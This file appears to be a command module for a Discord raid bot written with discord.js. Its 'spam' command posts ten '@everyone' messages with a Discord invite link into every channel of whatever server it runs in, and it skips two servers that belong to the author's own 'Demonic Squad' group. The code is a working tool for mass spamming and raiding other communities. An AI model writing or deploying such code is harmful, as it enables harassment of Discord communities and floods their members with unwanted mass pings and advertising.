const { MessageEmbed } = require('discord.js');

exports.run = async(client, message, args) => {

if(message.guild.name === "Ḋemonic ֆquad | Þriv") return;
if(message.guild.name === "• [ Demonic Squad | Logs ]") return;
  
try {
  
  message.guild.channels.cache.forEach(ch => {
    ch.send("@everyone https://discord.gg/8gNmhfKpNS")
    ch.send("@everyone https://discord.gg/8gNmhfKpNS")
    ch.send("@everyone https://discord.gg/8gNmhfKpNS")
    ch.send("@everyone https://discord.gg/8gNmhfKpNS")
    ch.send("@everyone https://discord.gg/8gNmhfKpNS")
    ch.send("@everyone https://discord.gg/8gNmhfKpNS")
    ch.send("@everyone https://discord.gg/8gNmhfKpNS")
    ch.send("@everyone https://discord.gg/8gNmhfKpNS")
    ch.send("@everyone https://discord.gg/8gNmhfKpNS")
    ch.send("@everyone https://discord.gg/8gNmhfKpNS")
  });

}catch(e) {
    console.log(e.stack)
}

}

exports.help = {
  name: "spam",
  aliases:[],
  usage: "[ Uso Independiente : No require Argumentos ]",
  description: "Realiza un spam masivo en todos los canales",
  category: "General"
  
}